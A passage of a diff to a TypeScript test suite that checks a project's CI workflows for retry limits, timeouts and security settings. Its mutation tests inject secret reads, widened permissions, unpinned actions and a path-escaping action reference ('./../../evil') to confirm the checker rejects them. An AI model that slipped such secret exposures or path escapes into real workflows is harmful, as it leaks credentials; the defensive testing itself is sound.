-            expect(oneAttempt).not.toBe(alsaRun);
-            const outcome = await runAlsaInstall(oneAttempt, Number.MAX_SAFE_INTEGER);
-            expect(() => assertExhaustionContract(outcome)).toThrow();
-        });
-
-        it(`${label} retry oracle rejects a successful exit after the third failed attempt`, async () => {
-            const swallowedFailure = alsaRun.replace(/\n\s*exit 1\s*$/, '\n  exit 0');
-            expect(swallowedFailure).not.toBe(alsaRun);
-            const outcome = await runAlsaInstall(swallowedFailure, Number.MAX_SAFE_INTEGER);
-            expect(outcome.attempts).toBe(3);
-            expect(outcome.sleeps).toEqual(['15', '30']);
-            expect(() => assertExhaustionContract(outcome)).toThrow();
-        });
-    }
-
-    it('reports a stalled ALSA child timeout, stops its process tree, and cleans up its fixture', async () => {
-        const ownedGroup: OwnedProcessGroup = { pid: undefined };
-        const kill = process.kill.bind(process);
-        const retiredIds = new Set<number>();
-        const retiredIdSignals: number[] = [];
-        const killSpy = vi.spyOn(process, 'kill').mockImplementation((pid, signal) => {
-            if (signal !== 0 && retiredIds.has(pid)) {
-                // Model identifier reuse without ever signaling an unrelated process.
-                retiredIdSignals.push(pid);
-                return true;
-            }
-            try {
-                return kill(pid, signal);
-            } catch (error) {
-                if ((error as NodeJS.ErrnoException).code === 'ESRCH') {
-                    retiredIds.add(pid);
-                }
-                throw error;
-            }
-        });
-        const failure = await (async () => {
-            try {
-                const alsaRun = stringAt(
-                    stepNamed(jobAt(validationWorkflow, 'rust'), 'Install ALSA development headers'),
-                    'run'
-                );
-                await runAlsaInstall(alsaRun, Number.MAX_SAFE_INTEGER, {
-                    stallChild: true,
-                    timeoutMs: 100,
-                    ownedGroup,
-                });
-                throw new Error('Expected the stalled ALSA child to fail with a bounded timeout');
-            } catch (error) {
-                if (!(error instanceof Error)) {
-                    throw error;
-                }
-                return {
-                    message: error.message,
-                    probeDirectory:
-                        'probeDirectory' in error && typeof error.probeDirectory === 'string'
-                            ? error.probeDirectory
-                            : undefined,
-                    stalledPid:
-                        'stalledPid' in error && typeof error.stalledPid === 'number' ? error.stalledPid : undefined,
-                    groupPid: 'groupPid' in error && typeof error.groupPid === 'number' ? error.groupPid : undefined,
-                };
-            }
-        })();
-        try {
-            expect(failure.message).toContain('error=ETIMEDOUT; status=null; signal=SIGTERM');
-            expect(failure.message.length).toBeLessThanOrEqual(
-                'ALSA probe child failed: error=ETIMEDOUT; status=null; signal=SIGTERM; stderr='.length +
-                    MAX_ALSA_PROBE_STDERR_CHARACTERS +
-                    '(empty)'.length
-            );
-            expect(failure.probeDirectory).toBeDefined();
-            if (failure.probeDirectory === undefined) {
-                throw new Error('The ALSA probe did not expose its fixture directory');
-            }
-            expect(existsSync(failure.probeDirectory)).toBe(false);
-            expect(failure.stalledPid).toBeDefined();
-            if (failure.stalledPid === undefined) {
-                throw new Error('The ALSA probe did not expose its stalled child PID');
-            }
-            const stalledPid = failure.stalledPid;
-            expect(() => process.kill(stalledPid, 0)).toThrow(expect.objectContaining({ code: 'ESRCH' }));
-            expect(failure.groupPid).toBeDefined();
-            if (failure.groupPid === undefined) {
-                throw new Error('The ALSA probe did not expose its process group');
-            }
-            const groupPid = failure.groupPid;
-            requireOwnedPid(groupPid);
-            expect(() => process.kill(-groupPid, 0)).toThrow(expect.objectContaining({ code: 'ESRCH' }));
-            expect(retiredIds).toContain(-groupPid);
-            expect(ownedGroup.pid).toBeUndefined();
-        } finally {
-            try {
-                if (processGroupAlive(ownedGroup)) {
-                    signalProcessGroup(ownedGroup, 'SIGKILL');
-                    await waitForProcessGroupExit(ownedGroup);
-                }
-                if (failure.probeDirectory !== undefined) {
-                    rmSync(failure.probeDirectory, { force: true, recursive: true });
-                }
-            } finally {
-                killSpy.mockRestore();
-            }
-        }
-        expect(retiredIdSignals).toEqual([]);
-    });
-
-    it('fails every Linux browser install step after its third failed attempt', () => {
-        const installs = [
-            { label: 'the offline smoke job', workflow: validationWorkflow, job: 'smoke' },
-            { label: 'the affected end-to-end job', workflow: heavyWorkflow, job: 'e2e' },
-            { label: 'the nightly end-to-end job', workflow: nightly, job: 'e2e' },
-        ];
-
-        for (const { label, workflow, job } of installs) {
-            const clone = asRecord(structuredClone(workflow), `swallowed failure ${label}`);
-            const step = stepNamed(jobAt(clone, job), 'Install Playwright browsers');
-            step.run = stringAt(step, 'run').replace(
-                BROWSER_INSTALL_FAILING_EXIT,
-                'if [ "$attempt" -eq 3 ]; then\n    true\n  fi'
-            );
-            expect(() =>
-                assertBoundedBrowserInstall(
-                    jobAt(clone, job),
-                    label,
-                    job === 'smoke' ? SMOKE_NON_INSTALL_SECONDS : E2E_SHARD_NON_INSTALL_SECONDS,
-                    job === 'smoke' ? SMOKE_JOB_MINUTES : E2E_JOB_MINUTES
-                )
-            ).toThrow(`${label} must fail the step after the third failed install attempt`);
-        }
     });
 
     it('gives every pull request an offline smoke set and a diff secret scan', () => {
@@ -4124,13 +3085,6 @@ export -f sudo timeout sleep apt-get
         jobAt(eventGatedSmoke, 'smoke').if = EVENT_GATED_SMOKE_CONDITION;
         expect(() => assertOfflineSmokeJob(eventGatedSmoke)).toThrow(
             'the offline smoke job must run on every pull-request run that touches the browser surface'
-        );
-
-        const unretriedInstall = asRecord(structuredClone(validationWorkflow), 'unretried install validationWorkflow');
-        stepNamed(jobAt(unretriedInstall, 'smoke'), 'Install Playwright browsers').run =
-            'pnpm exec playwright install --with-deps chromium';
-        expect(() => assertOfflineSmokeJob(unretriedInstall)).toThrow(
-            'the offline smoke job must retry browser and dependency installation against mirror outages'
         );
 
         const eventGatedDiffScan = asRecord(
@@ -4163,146 +3117,12 @@ export -f sudo timeout sleep apt-get
         );
     });
 
-    it('bounds a stalled heavy E2E browser install and keeps its retry failure fatal', () => {
-        const e2e = jobAt(heavyWorkflow, 'e2e');
-        const installRun = stringAt(stepNamed(e2e, 'Install Playwright browsers'), 'run');
+    it('requires the heavy browser runtime proof before its unchanged shard command', () => {
         expect(() => assertBoundedHeavyE2eInstall(heavyWorkflow)).not.toThrow();
-
-        const unboundedInstall = cloneWorkflows('unbounded heavy E2E browser install');
-        stepNamed(jobAt(unboundedInstall.heavy, 'e2e'), 'Install Playwright browsers').run = installRun.replace(
-            USER_BROWSER_INSTALL_COMMAND,
-            'pnpm exec playwright install chromium'
-        );
-        expect(() => assertBoundedHeavyE2eInstall(unboundedInstall.heavy)).toThrow(
-            'the heavy E2E job must bound the browser download with its own timeout'
-        );
-
-        const unretriedInstall = cloneWorkflows('unretried heavy E2E browser install');
-        stepNamed(jobAt(unretriedInstall.heavy, 'e2e'), 'Install Playwright browsers').run = installRun.replace(
-            'sleep $((attempt * 5))',
-            'sleep 0'
-        );
-        expect(() => assertBoundedHeavyE2eInstall(unretriedInstall.heavy)).toThrow(
-            'the heavy E2E install must retry three bounded attempts and fail after the third'
-        );
-
-        const overlongInstall = cloneWorkflows('overlong heavy E2E browser install');
-        const overlongJob = jobAt(overlongInstall.heavy, 'e2e');
-        stepNamed(overlongJob, 'Install Playwright browsers')['timeout-minutes'] = overlongJob['timeout-minutes'];
-        expect(() => assertBoundedHeavyE2eInstall(overlongInstall.heavy)).toThrow(
-            'the Playwright install step must be bounded below the E2E job limit'
-        );
+        const bypassed = cloneWorkflows('bypassed heavy runtime proof');
+        stepNamed(jobAt(bypassed.heavy, 'e2e'), 'Run shard').if = 'always()';
+        expect(() => assertBoundedHeavyE2eInstall(bypassed.heavy)).toThrow('without conditional admission');
     });
-
-    const gnuTimeout = process.env.SOURDAW_GNU_TIMEOUT ?? (process.platform === 'linux' ? 'timeout' : 'gtimeout');
-    const timeoutVersion = spawnSync(gnuTimeout, ['--version'], { encoding: 'utf8' });
-    const hasGnuTimeout = timeoutVersion.status === 0 && timeoutVersion.stdout.startsWith('timeout (GNU coreutils)');
-
-    for (const startupDelay of [0, 1.1]) {
-        it.runIf(process.platform === 'linux' || hasGnuTimeout)(
-            `kills a ready installer before retry after ${startupDelay}s startup`,
-            () => {
-                expect(hasGnuTimeout, 'the Ubuntu runner must use GNU timeout').toBe(true);
-                const psProbe = spawnSync('ps', ['-o', 'stat=', '-p', String(process.pid)], { encoding: 'utf8' });
-                expect(psProbe.status).toBe(0);
-                expect(psProbe.stdout.trim()).not.toBe('');
-                const installRun = stringAt(
-                    stepNamed(jobAt(heavyWorkflow, 'e2e'), 'Install Playwright browsers'),
-                    'run'
-                );
-                const probeDirectory = mkdtempSync(join(tmpdir(), 'sourdaw-playwright-process-group-'));
-                const pidLog = join(probeDirectory, 'pids.log');
-                const overlapLog = join(probeDirectory, 'overlap.log');
-                const attemptLog = join(probeDirectory, 'attempts.log');
-                const installer = join(probeDirectory, 'installer.py');
-                writeFileSync(
-                    installer,
-                    [
-                        'import os, signal, time',
-                        'signal.signal(signal.SIGTERM, signal.SIG_IGN)',
-                        'time.sleep(float(os.environ["STALL_STARTUP_DELAY"]))',
-                        'with open(os.environ["STALL_PID_LOG"], "a") as log:',
-                        '    log.write(str(os.getpid()) + "\\n")',
-                        '    log.flush()',
-                        'os.kill(int(os.environ["TIMEOUT_PID"]), signal.SIGALRM)',
-                        'time.sleep(20)',
-                    ].join('\n')
-                );
-                writeFileSync(
-                    join(probeDirectory, 'pnpm'),
-                    [
-                        '#!/usr/bin/env bash',
-                        'trap "exit 143" TERM',
-                        'printf "attempt\\n" >> "$ATTEMPT_LOG"',
-                        'if [ -f "$STALL_PID_LOG" ]; then',
-                        '  while read -r pid; do',
-                        '    state=$(ps -o stat= -p "$pid" 2>/dev/null || true)',
-                        '    case "$state" in ""|Z*) ;; *) printf "%s\\n" "$pid" >> "$OVERLAP_LOG" ;; esac',
-                        '  done < "$STALL_PID_LOG"',
-                        'fi',
-                        'TIMEOUT_PID=$PPID python3 "$STALL_INSTALLER" &',
-                        'wait "$!"',
-                    ].join('\n'),
-                    { mode: 0o755 }
-                );
-                // The root dependency half succeeds, so each attempt reaches the
-                // user-side browser download that this probe stalls.
-                writeFileSync(join(probeDirectory, 'sudo'), '#!/bin/sh\nexit 0\n', { mode: 0o755 });
-                try {
-                    if (gnuTimeout !== 'timeout') {
-                        const resolvedTimeout = spawnSync('which', [gnuTimeout], { encoding: 'utf8' });
-                        expect(resolvedTimeout.status).toBe(0);
-                        symlinkSync(resolvedTimeout.stdout.trim(), join(probeDirectory, 'timeout'));
-                    }
-                    // The child asks GNU timeout to fire its own expiry handler
-                    // only after recording readiness; startup time cannot consume
-                    // the synthetic deadline before a descendant exists.
-                    const probeRun = installRun.replace('sleep $((attempt * 5))', 'sleep 0');
-                    expect(probeRun).not.toBe(installRun);
-                    const result = spawnSync('bash', ['-c', probeRun], {
-                        env: {
-                            ...process.env,
-                            ATTEMPT_LOG: attemptLog,
-                            OVERLAP_LOG: overlapLog,
-                            STALL_INSTALLER: installer,
-                            STALL_PID_LOG: pidLog,
-                            STALL_STARTUP_DELAY: String(startupDelay),
-                            PATH: `${probeDirectory}${delimiter}${process.env.PATH ?? ''}`,
-                        },
-                        stdio: 'ignore',
-                        timeout: 10_000,
-                    });
-                    expect(result.error).toBeUndefined();
-                    expect(result.status).toBe(1);
-                    expect(existsSync(attemptLog), 'pnpm wrapper never started').toBe(true);
-                    expect(readFileSync(attemptLog, 'utf8').trim().split('\n')).toHaveLength(3);
-                    expect(existsSync(pidLog), 'installer never registered before expiry').toBe(true);
-                    expect(
-                        readFileSync(pidLog, 'utf8').trim().split('\n'),
-                        'every attempt must register before expiry'
-                    ).toHaveLength(3);
-                    expect(existsSync(overlapLog)).toBe(false);
-                    for (const pid of readFileSync(pidLog, 'utf8').trim().split('\n')) {
-                        const state = spawnSync('ps', ['-o', 'stat=', '-p', pid], { encoding: 'utf8' }).stdout.trim();
-                        expect(state === '' || state.startsWith('Z'), `installer ${pid} survived`).toBe(true);
-                    }
-                } finally {
-                    if (existsSync(pidLog)) {
-                        for (const pid of readFileSync(pidLog, 'utf8').trim().split('\n')) {
-                            if (pid) {
-                                try {
-                                    process.kill(Number(pid), 'SIGKILL');
-                                } catch {
-                                    /* already exited */
-                                }
-                            }
-                        }
-                    }
-                    rmSync(probeDirectory, { force: true, recursive: true });
-                }
-            }
-        );
-    }
 
     it('makes selected validation, E2E and CodeQL decisive for the required Gate', () => {
         expect(() => assertJobGraph(workflowSet())).not.toThrow();
@@ -4435,69 +3255,139 @@ export -f sudo timeout sleep apt-get
         }
     });
 
-    it('keeps a failed or missing E2E shadow artifact outside every required result', () => {
-        const health = workflowSet().health;
-        const shadow = jobAt(health, 'selection-shadow');
-        expect(shadow.needs).toBe('scope');
-        expect(shadow.outputs).toBeUndefined();
-        expect(shadow['continue-on-error']).toBeUndefined();
-        expect(arrayAt(jobAt(health, 'gate'), 'needs')).toEqual(['scope', 'validation', 'affected', 'codeql']);
-        expect(jobAt(health, 'validation').needs).toBe('scope');
-        expect(jobAt(health, 'affected').needs).toEqual(['scope', 'validation']);
-        expect(stepNamed(shadow, 'Checkout candidate head').with).toEqual({
-            ref: '${{ github.event.pull_request.head.sha }}',
-            'fetch-depth': 0,
-            'persist-credentials': false,
-        });
-        expect(stepNamed(shadow, 'Checkout immutable integration commit').with).toEqual({
-            ref: '${{ github.sha }}',
-            path: 'shadow-integration',
-            'fetch-depth': 0,
-            'persist-credentials': false,
-        });
-        expect(stepNamed(shadow, 'Checkout immutable shadow control').with).toEqual({
-            ref: '${{ github.event.pull_request.base.sha }}',
-            path: 'shadow-control',
-            'fetch-depth': 0,
-            'persist-credentials': false,
-        });
-        expect(stepNamed(shadow, 'Download authoritative scope').with).toEqual({
-            name: 'pr-validation-scope',
-            path: 'shadow-scope',
-        });
-        expect(stepNamed(shadow, 'Set up pnpm').with).toEqual({ package_json_file: 'shadow-control/package.json' });
-        expect(stepNamed(shadow, 'Set up Node').with).toMatchObject({
-            'cache-dependency-path': 'shadow-control/pnpm-lock.yaml',
-        });
-        expect(stepNamed(shadow, 'Install dependencies')['working-directory']).toBe('shadow-control');
-        expect(stepNamed(shadow, 'Upload shadow measurement').with).toMatchObject({
-            name: 'e2e-selection-shadow',
-            'if-no-files-found': 'error',
-        });
-        expect(stepNamed(shadow, 'Upload shadow measurement').if).toBe('${{ always() }}');
-        expect(stepNamed(shadow, 'Measure shadow selection').run).toBe(
-            'node shadow-control/scripts/e2eSelectionShadow.ts shadow-scope/pr-validation-scope.json'
+    it('requires the real hosted installer systemd proof for tooling changes', () => {
+        const staticJob = jobAt(validationWorkflow, 'static');
+        const proof = stepNamed(staticJob, 'Hosted installer systemd proof');
+        expect(proof.run).toBe('pnpm test:run scripts/__tests__/hostedAptInstall.spec.ts --maxWorkers=2');
+        expect(recordAt(proof, 'env')).toEqual({ SOURDAW_SYSTEMD_TESTS: '1' });
+        expect(staticJob['runs-on']).toBe('ubuntu-latest');
+        const steps = jobSteps('validation.yml', 'static', staticJob);
+        expect(steps.findIndex((step) => step.name === 'Install dependencies')).toBeLessThan(
+            steps.findIndex((step) => step.name === 'Hosted installer systemd proof')
         );
-        expect(stepNamed(shadow, 'Measure shadow selection').env).toEqual({
-            BASE_SHA: '${{ github.event.pull_request.base.sha }}',
-            HEAD_SHA: '${{ github.event.pull_request.head.sha }}',
-            INTEGRATION_SHA: '${{ github.sha }}',
-            INTEGRATION_ROOT: 'shadow-integration',
-            CONTROL_ROOT: 'shadow-control',
+        const scope = runScopeScript(assertScopeContract(validationWorkflow), 'pull_request', {
+            PROFILE: 'tooling',
+            WEB: 'true',
+            BROWSER: 'false',
         });
-        const gateScript = assertGateContract(health, 'gate', 'Gate', GATE_CONDITION);
-        const required = JSON.stringify({
-            scope: { result: 'success', outputs: { browser: 'true', 'browser-ai': 'false', codeql: 'false' } },
-            validation: { result: 'success' },
-            affected: { result: 'success' },
-            codeql: { result: 'skipped' },
-        });
-        expect(runResultsGuard(gateScript, required)).toBe(0);
-        const diagnosticAsNeed = structuredClone(health);
-        arrayAt(jobAt(diagnosticAsNeed, 'gate'), 'needs').push('selection-shadow');
-        expect(() => assertJobGraph({ ...workflowSet(), health: diagnosticAsNeed })).toThrow(
-            'gate must depend on exactly the pinned member list'
+        expect(scope.tooling).toBe('true');
+        expect(selectedPrValidationJobs(scope)).toContain('static');
+        expect(arrayAt(jobAt(validationWorkflow, 'validation-gate'), 'needs')).toContain('static');
+
+        const missing = cloneWorkflows('missing hosted installer proof');
+        removeStepNamed(jobAt(missing.validation, 'static'), 'Hosted installer systemd proof');
+        expect(() => assertStepInventory(missing)).toThrow('validation.yml job static steps drifted');
+        const conditional = cloneWorkflows('conditional hosted installer proof');
+        stepNamed(jobAt(conditional.validation, 'static'), 'Hosted installer systemd proof').if = 'false';
+        expect(() => assertUnconditionalSteps(conditional)).toThrow();
+        const softened = cloneWorkflows('softened hosted installer proof');
+        stepNamed(jobAt(softened.validation, 'static'), 'Hosted installer systemd proof')['continue-on-error'] = true;
+        expect(() => assertNoContinueOnError(softened)).toThrow();
+    });
+
+    it('requires campaign fixture freshness for Rust-only changes', () => {
+        const staticJob = jobAt(validationWorkflow, 'static');
+        expect(() => assertCampaignFixtureCommand(staticJob)).not.toThrow();
+        const steps = jobSteps('validation.yml', 'static', staticJob);
+        expect(steps.findIndex((step) => step.name === 'Install dependencies')).toBeLessThan(
+            steps.findIndex((step) => step.name === 'Campaign fixture freshness')
         );
+        const scope = runScopeScript(assertScopeContract(validationWorkflow), 'pull_request', {
+            RUST: 'true',
+            BROWSER: 'false',
+        });
+        expect(scope.web).toBe('false');
+        expect(scope.e2e).toBe('false');
+        expect(selectedPrValidationJobs(scope)).toContain('static');
+        expect(arrayAt(jobAt(validationWorkflow, 'validation-gate'), 'needs')).toContain('static');
+
+        const missing = cloneWorkflows('missing campaign fixture freshness');
+        removeStepNamed(jobAt(missing.validation, 'static'), 'Campaign fixture freshness');
+        expect(() => assertStepInventory(missing)).toThrow('validation.yml job static steps drifted');
+        const conditional = cloneWorkflows('conditional campaign fixture freshness');
+        stepNamed(jobAt(conditional.validation, 'static'), 'Campaign fixture freshness').if = 'false';
+        expect(() => assertUnconditionalSteps(conditional)).toThrow();
+        const softened = cloneWorkflows('softened campaign fixture freshness');
+        stepNamed(jobAt(softened.validation, 'static'), 'Campaign fixture freshness')['continue-on-error'] = true;
+        expect(() => assertNoContinueOnError(softened)).toThrow();
+        const wrong = cloneWorkflows('wrong campaign fixture case');
+        stepNamed(jobAt(wrong.validation, 'static'), 'Campaign fixture freshness').run = 'pnpm test:run';
+        expect(() => assertCampaignFixtureCommand(jobAt(wrong.validation, 'static'))).toThrow();
+    });
+
+    it('runs release inventory on every pull request and nightly with full provenance history', () => {
+        const validationStatic = jobSteps('validation.yml', 'static', jobAt(validationWorkflow, 'static'));
+        const nightlyStatic = jobSteps('nightly.yml', 'static', jobAt(nightly, 'static'));
+        for (const [workflowName, staticJob] of [
+            ['validation.yml', jobAt(validationWorkflow, 'static')],
+            ['nightly.yml', jobAt(nightly, 'static')],
+        ] as const) {
+            expect(jobSteps(workflowName, 'static', staticJob).map((step) => step.name)).toContain('Release inventory');
+            const inventory = stepNamed(staticJob, 'Release inventory');
+            expect(() => assertReleaseInventoryCommand(staticJob)).not.toThrow();
+            expect(inventory.if).toBeUndefined();
+            expect(inventory['continue-on-error']).toBeUndefined();
+        }
+        expect(validationStatic.map((step) => step.name)).toContain('Release inventory');
+        expect(nightlyStatic.map((step) => step.name)).toContain('Release inventory');
+        expect(() => assertUnitProvenanceHistory(validationWorkflow)).not.toThrow();
+
+        const droppedPr = cloneWorkflows('release inventory dropped from validation');
+        removeStepNamed(jobAt(droppedPr.validation, 'static'), 'Release inventory');
+        expect(() => assertStepInventory(droppedPr)).toThrow('validation.yml job static steps drifted');
+
+        const conditionalPr = cloneWorkflows('release inventory conditional in validation');
+        stepNamed(jobAt(conditionalPr.validation, 'static'), 'Release inventory').if = false;
+        expect(() => assertUnconditionalSteps(conditionalPr)).toThrow();
+
+        const wrongCommand = cloneWorkflows('release inventory command changed');
+        stepNamed(jobAt(wrongCommand.validation, 'static'), 'Release inventory').run = 'pnpm test:collection-scope';
+        expect(() => assertReleaseInventoryCommand(jobAt(wrongCommand.validation, 'static'))).toThrow(
+            'release inventory must run its exact validation command'
+        );
+
+        const softenedPr = cloneWorkflows('release inventory softened in validation');
+        stepNamed(jobAt(softenedPr.validation, 'static'), 'Release inventory')['continue-on-error'] = true;
+        expect(() => assertNoContinueOnError(softenedPr)).toThrow();
+
+        const shallowPr = cloneWorkflows('release inventory shallow validation checkout');
+        recordAt(stepNamed(jobAt(shallowPr.validation, 'static'), 'Checkout'), 'with')['fetch-depth'] = 1;
+        expect(() => assertUnitProvenanceHistory(shallowPr.validation)).toThrow(
+            'static must retain complete history for release inventory provenance'
+        );
+
+        const baseRevision = cloneWorkflows('release inventory on pull request base');
+        recordAt(stepNamed(jobAt(baseRevision.validation, 'static'), 'Checkout'), 'with').ref =
+            '${{ github.event.pull_request.base.sha }}';
+        expect(() => assertUnitProvenanceHistory(baseRevision.validation)).toThrow(
+            'static release inventory must inspect the current workflow revision'
+        );
+
+        const dropped = cloneWorkflows('release inventory dropped from nightly');
+        removeStepNamed(jobAt(dropped.nightly, 'static'), 'Release inventory');
+        expect(() => assertStepInventory(dropped)).toThrow('nightly.yml job static steps drifted');
+    });
+
+    it('reserves bounded setup, full lint, and cleanup time in the lint job', () => {
+        expect(() => assertLintTimeBudgets(validationWorkflow)).not.toThrow();
+        const oldJob = structuredClone(validationWorkflow);
+        jobAt(oldJob, 'lint')['timeout-minutes'] = 20;
+        expect(() => assertLintTimeBudgets(oldJob)).toThrow('five minutes for cleanup');
+        for (const name of ['Checkout', 'Set up pnpm', 'Set up Node', 'Install dependencies', 'Lint']) {
+            const missing = structuredClone(validationWorkflow);
+            delete stepNamed(jobAt(missing, 'lint'), name)['timeout-minutes'];
+            expect(() => assertLintTimeBudgets(missing), name).toThrow();
+        }
+        const overlong = structuredClone(validationWorkflow);
+        jobAt(overlong, 'lint')['timeout-minutes'] = 46;
+        expect(() => assertLintTimeBudgets(overlong)).toThrow('five minutes for cleanup');
+        const lint = jobAt(validationWorkflow, 'lint');
+        expect(lint.if).toBe("needs.decide.outputs.code == 'true'");
+        expect(stepNamed(lint, 'Lint').run).toBe('pnpm lint:full');
+        expect(recordAt(stepNamed(lint, 'Lint'), 'env')).toEqual({
+            SOURDAW_LINT_CONCURRENCY: 'auto',
+            SOURDAW_LINT_THREADS: '0',
+        });
     });
 
     it('sweeps every job and step for softening, with only the pinned conditional steps', () => {
@@ -4729,6 +3619,177 @@ export -f sudo timeout sleep apt-get
         );
     });
 
+    it('pins every registered workflow security surface by name', () => {
+        const surface = (set: WorkflowSet) => () =>
+            assertWorkflowSecuritySurface(Object.fromEntries(workflowFiles(set)));
+        expect(surface(workflowSet())).not.toThrow();
+
+        // Each mutation below passed every other pin once the whole-file
+        // snapshot was gone; each must fail here on its own.
+        const widenedHeavyLeg = cloneWorkflows('widened heavy e2e permissions');
+        jobAt(widenedHeavyLeg.heavy, 'e2e').permissions = { contents: 'write' };
+        expect(surface(widenedHeavyLeg)).toThrow('heavy-gates.yml job e2e must inherit the workflow-level permissions');
+
+        const widenedReporter = cloneWorkflows('widened nightly reporter permissions');
+        recordAt(jobAt(widenedReporter.nightly, 'nightly-report'), 'permissions').contents = 'write';
+        expect(surface(widenedReporter)).toThrow(
+            'nightly.yml job nightly-report must keep exactly its pinned permissions'
+        );
+
+        const leakedStepSecret = cloneWorkflows('step secret on the scope job');
+        stepNamed(jobAt(leakedStepSecret.health, 'scope'), 'Plan affected checks').env = {
+            ...recordAt(stepNamed(jobAt(leakedStepSecret.health, 'scope'), 'Plan affected checks'), 'env'),
+            TOKEN: '${{ secrets.VERCEL_TOKEN }}',
+        };
+        expect(surface(leakedStepSecret)).toThrow(
+            'health-gates.yml job scope must read exactly its pinned secrets: none'
+        );
+
+        const jobToken = cloneWorkflows('job token on static');
+        jobAt(jobToken.validation, 'static').env = { GH_TOKEN: '${{ github.token }}' };
+        expect(surface(jobToken)).toThrow('validation.yml job static must read exactly its pinned secrets: none');
+
+        const spacedJobToken = cloneWorkflows('spaced job token on static');
+        jobAt(spacedJobToken.validation, 'static').env = { GH_TOKEN: '${{ GitHub . Token }}' };
+        expect(surface(spacedJobToken)).toThrow('validation.yml job static must read exactly its pinned secrets: none');
+
+        for (const wholeGithub of ['${{ github }}', "${{ join(github.*, ',') }}", "${{ format('{0}', github) }}"]) {
+            const wholeContext = cloneWorkflows(`whole github context ${wholeGithub}`);
+            jobAt(wholeContext.validation, 'static').env = { CONTEXT: wholeGithub };
+            expect(surface(wholeContext), wholeGithub).toThrow(
+                'validation.yml job static must read exactly its pinned secrets: none'
+            );
+        }
+        const fieldRead = cloneWorkflows('github field read on static');
+        jobAt(fieldRead.validation, 'static').env = {
+            HEAD: '${{ github.event.pull_request.head.sha }}',
+            REPOSITORY: '${{ github.repository }}',
+        };
+        expect(surface(fieldRead)).not.toThrow();
+
+        const upperCaseContext = cloneWorkflows('upper-case secrets context on static');
+        jobAt(upperCaseContext.validation, 'static').env = { TOKEN: '${{ SECRETS.VERCEL_TOKEN }}' };
+        expect(surface(upperCaseContext)).toThrow(
+            'validation.yml job static must read exactly its pinned secrets: none'
+        );
+
+        const leakedWorkflowSecret = cloneWorkflows('workflow-level secret');
+        leakedWorkflowSecret.validation.env = { TOKEN: '${{ secrets.VERCEL_TOKEN }}' };
+        expect(surface(leakedWorkflowSecret)).toThrow('validation.yml must not read a secret outside a pinned job');
+
+        const wholeContext = cloneWorkflows('whole secrets context');
+        jobAt(wholeContext.heavy, 'heavy-gate').if = 'always() && toJSON(secrets) != null';
+        expect(surface(wholeContext)).toThrow(
+            'heavy-gates.yml job heavy-gate must read exactly its pinned secrets: none'
+        );
+
+        const extraDeploySecret = cloneWorkflows('extra deploy secret');
+        jobAt(extraDeploySecret.nightly, 'deploy-web').env = { EXTRA: '${{ secrets.JEV_KEY }}' };
+        expect(surface(extraDeploySecret)).toThrow('nightly.yml job deploy-web must read exactly its pinned secrets');
+
+        const inheritedSecrets = cloneWorkflows('secrets inherited by validation');
+        jobAt(inheritedSecrets.prChecks, 'validation').secrets = 'inherit';
+        expect(surface(inheritedSecrets)).toThrow(
+            'pr-checks.yml job validation must not pass secrets to a reusable workflow'
+        );
+
+        const environment = cloneWorkflows('environment on a validation leg');
+        jobAt(environment.validation, 'build').environment = 'Production';
+        expect(surface(environment)).toThrow('validation.yml job build must not name a deployment environment');
+
+        const credentialedDeploy = cloneWorkflows('credentialed deploy checkout');
+        delete recordAt(
+            stepNamed(jobAt(credentialedDeploy.nightly, 'deploy-web'), 'Checkout the validated revision'),
+            'with'
+        )['persist-credentials'];
+        expect(surface(credentialedDeploy)).toThrow(
+            'nightly.yml job deploy-web step Checkout the validated revision must check out with persist-credentials: false'
+        );
+
+        const floatingAction = cloneWorkflows('floating action ref on lint');
+        stepNamed(jobAt(floatingAction.validation, 'lint'), 'Set up pnpm').uses = 'some-org/action-setup@main';
+        expect(surface(floatingAction)).toThrow(
+            'validation.yml job lint must pin "some-org/action-setup@main" to a full commit SHA or a ./ path inside the repository'
+        );
+
+        const escapingLocalAction = cloneWorkflows('local action escaping the repository');
+        stepNamed(jobAt(escapingLocalAction.validation, 'lint'), 'Set up pnpm').uses = './../../evil';
+        expect(surface(escapingLocalAction)).toThrow(
+            'validation.yml job lint must pin "./../../evil" to a full commit SHA or a ./ path inside the repository'
+        );
+
+        const computedGate = cloneWorkflows('computed Gate name on push checks');
+        jobAt(computedGate.prChecks, 'scope').name = "${{ 'Ga' }}te";
+        expect(surface(computedGate)).toThrow(
+            'pr-checks.yml job scope must not compute its check name from an expression'
+        );
+
+        const computedShardName = cloneWorkflows('matrix-driven name change');
+        jobAt(computedShardName.validation, 'unit').name = '${{ matrix.shard }}';
+        expect(surface(computedShardName)).toThrow(
+            'validation.yml job unit must not compute its check name from an expression'
+        );
+
+        const emptyNamedGate = cloneWorkflows('empty-named Gate-keyed nightly job');
+        recordAt(emptyNamedGate.nightly, 'jobs').Gate = {
+            name: '',
+            'runs-on': 'ubuntu-latest',
+            steps: [{ name: 'Pass', run: 'true' }],
+        };
+        expect(surface(emptyNamedGate)).toThrow('nightly.yml job Gate must not be named Gate');
+
+        const secondGate = cloneWorkflows('second Gate in health gates');
+        jobAt(secondGate.health, 'admission').name = 'Gate';
+        expect(surface(secondGate)).toThrow('health-gates.yml job admission must not be named Gate');
+    });
+
+    it('pins the trusted nightly evidence reporter before granting issue writes', () => {
+        expect(HEALTH_GATE_WORKFLOW_FILES).toContain('nightly-evidence-report.yml');
+        const surface = (set: WorkflowSet) => () =>
+            assertWorkflowSecuritySurface(Object.fromEntries(workflowFiles(set)));
+        expect(surface(workflowSet())).not.toThrow();
+
+        for (const job of ['validate', 'publish']) {
+            const widened = cloneWorkflows(`nightly evidence ${job} permissions`);
+            recordAt(jobAt(widened.nightlyEvidenceReporter, job), 'permissions').contents = 'write';
+            expect(surface(widened)).toThrow(
+                `nightly-evidence-report.yml job ${job} must keep exactly its pinned permissions`
+            );
+
+            const extraSecret = cloneWorkflows(`nightly evidence ${job} secret`);
+            jobAt(extraSecret.nightlyEvidenceReporter, job).env = { TOKEN: '${{ secrets.JEV_KEY }}' };
+            expect(surface(extraSecret)).toThrow(
+                `nightly-evidence-report.yml job ${job} must read exactly its pinned secrets: GITHUB_TOKEN`
+            );
+        }
+
+        for (const [job, step] of [
+            ['validate', 'Checkout trusted default-branch reporter'],
+            ['publish', 'Checkout trusted default-branch repository context'],
+        ] as const) {
+            const persisted = cloneWorkflows(`nightly evidence ${job} persisted token`);
+            delete recordAt(stepNamed(jobAt(persisted.nightlyEvidenceReporter, job), step), 'with')[
+                'persist-credentials'
+            ];
+            expect(surface(persisted)).toThrow(
